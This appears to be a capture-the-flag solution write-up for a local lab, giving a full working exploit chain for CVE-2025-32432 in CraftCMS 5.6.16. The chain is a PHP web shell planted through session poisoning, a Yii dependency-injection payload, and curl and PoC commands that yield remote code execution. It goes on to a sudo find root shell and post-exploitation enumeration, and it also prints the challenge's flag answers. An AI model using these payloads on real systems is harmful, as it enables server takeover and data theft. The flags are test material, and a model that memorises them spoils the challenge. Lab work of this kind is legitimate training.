## Solution

### Phase 1: Reconnaissance

1. **Identify the Target**:
```bash
curl http://localhost:4019
```

2. **Identify CraftCMS Version**:
Check the admin login page or HTML source:
```bash
curl -s http://localhost:4019 | grep -i craft
```

You should identify CraftCMS 5.6.16, which is vulnerable to CVE-2025-32432.

3. **Verify Installation**:
Ensure CraftCMS is installed (not showing installation wizard):
```bash
curl -s http://localhost:4019/admin/login
```

### Phase 2: Understanding the Vulnerability

CVE-2025-32432 is a **two-packet chain attack**:

#### Packet 1: Session Poisoning
- Send a GET request with malicious PHP code in a parameter
- CraftCMS writes this to the session file at `/tmp/sess_{sessionid}`
- Extract the CSRF token and session ID for the next step

#### Packet 2: Code Execution
- Send a POST request to `/actions/assets/generate-transform`
- Exploit Yii's dependency injection by setting `__class` to `yii\rbac\PhpManager`
- Point `itemFile` constructor parameter to the poisoned session file
- `PhpManager` includes and executes the session file containing your PHP code

### Phase 3: Exploitation - FLAG 1 (RCE)

#### Method 1: Using the Included POC Script (Recommended)

The challenge includes a Python POC script based on the public exploit:

```bash
cd Challenges/xray-craftcms-rce/exploit
python3 poc.py -u http://localhost:4019 --asset-id 1 -c "whoami"
```

**Test RCE**:
```bash
python3 poc.py -u http://localhost:4019 --asset-id 1 -c "id"
```

**Get FLAG 1**:
```bash
python3 poc.py -u http://localhost:4019 --asset-id 1 -c "cat /var/www/flag1.txt"
```

Expected output:
```
cr4ftcms_rc3_v14_xx3
```

#### Method 2: Manual Exploitation with curl

**Step 1: Session Poisoning**

```bash
# Craft the PHP payload (will be written to session file)
PHP_PAYLOAD='<?=shell_exec($_GET["cmd"]);exit;?>'

# Send GET request to poison session file
curl -s "http://localhost:4019/index.php?p=admin/dashboard&cve202532432=${PHP_PAYLOAD}" \
  -c cookies.txt \
  -o response1.html

# Extract CSRF token from response
CSRF_TOKEN=$(grep -oP 'name="CRAFT_CSRF_TOKEN" value="\K[^"]+' response1.html | head -1)

# Extract session ID from cookie
SESSION_ID=$(grep -oP 'CraftSessionId\s+\K[a-f0-9]+' cookies.txt)

echo "CSRF Token: $CSRF_TOKEN"
echo "Session ID: $SESSION_ID"
```

**Step 2: Trigger Code Execution**

```bash
# Prepare the exploit payload
cat > exploit.json << EOF
{
  "assetId": 1,
  "handle": {
    "width": 1,
    "height": 1,
    "as hack": {
      "class": "craft\\\\behaviors\\\\FieldLayoutBehavior",
      "__class": "yii\\\\rbac\\\\PhpManager",
      "__construct()": [{
        "itemFile": "/tmp/sess_${SESSION_ID}"
      }]
    }
  }
}
EOF

# Execute command (read FLAG 1)
curl -s -X POST "http://localhost:4019/index.php?p=actions/assets/generate-transform&cmd=cat%20/var/www/flag1.txt" \
  -H "Content-Type: application/json" \
  -H "X-CSRF-Token: ${CSRF_TOKEN}" \
  -b cookies.txt \
  -d @exploit.json
```

The flag will appear in the response before the JSON data.

#### Method 3: Using Public Exploits

Download the public POC from security researchers:

```bash
# Clone or download the exploit
wget https://raw.githubusercontent.com/vulhub/vulhub/master/craftcms/CVE-2025-32432/poc.py

# Run the exploit
python3 poc.py -u http://localhost:4019 --asset-id 1 -c "cat /var/www/flag1.txt"
```

### Phase 4: Privilege Escalation - FLAG 2 (Root Access)

Once you have RCE as www-data, you need to escalate to root.

#### Step 1: Enumerate Privilege Escalation Vectors

**Check sudo permissions**:
```bash
python3 poc.py -u http://localhost:4019 --asset-id 1 -c "sudo -l"
```

Expected output:
```
User www-data may run the following commands on localhost:
    (root) NOPASSWD: /usr/bin/find
```

This reveals that www-data can run `/usr/bin/find` as root without a password!

#### Step 2: Exploit sudo + find for Privilege Escalation

The `find` command can be abused for privilege escalation using GTFOBins techniques.

**Method 1: Execute commands as root**

```bash
# Use find's -exec flag to execute commands as root
python3 poc.py -u http://localhost:4019 --asset-id 1 -c "sudo find /flag.txt -exec cat {} \;"
```

Expected output:
```
r00t_pr1v3sc_4ch13v3d
```

**Method 2: Read flag using find's file operations**

```bash
# Use find to read the file directly
python3 poc.py -u http://localhost:4019 --asset-id 1 -c "sudo find /flag.txt -type f -exec cat {} +"
```

**Method 3: Get a root shell (if needed)**

```bash
# Use find to spawn a root shell
python3 poc.py -u http://localhost:4019 --asset-id 1 -c "sudo find /etc/passwd -exec /bin/sh \;"
```

Then execute commands:
```bash
python3 poc.py -u http://localhost:4019 --asset-id 1 -c "whoami"  # Should show 'root'
python3 poc.py -u http://localhost:4019 --asset-id 1 -c "cat /flag.txt"
```

### Phase 5: Alternative Privilege Escalation Techniques

If `find` wasn't available, here are other enumeration steps:

1. **Check for SUID binaries**:
```bash
python3 poc.py -u http://localhost:4019 --asset-id 1 -c "find / -perm -4000 2>/dev/null"
```

2. **Check writable files**:
```bash
python3 poc.py -u http://localhost:4019 --asset-id 1 -c "find / -writable -type f 2>/dev/null | grep -v proc"
```

3. **Check kernel version** (for kernel exploits):
```bash
python3 poc.py -u http://localhost:4019 --asset-id 1 -c "uname -a"
```

4. **Check for Docker socket** (container escape):
```bash
python3 poc.py -u http://localhost:4019 --asset-id 1 -c "ls -la /var/run/docker.sock"
```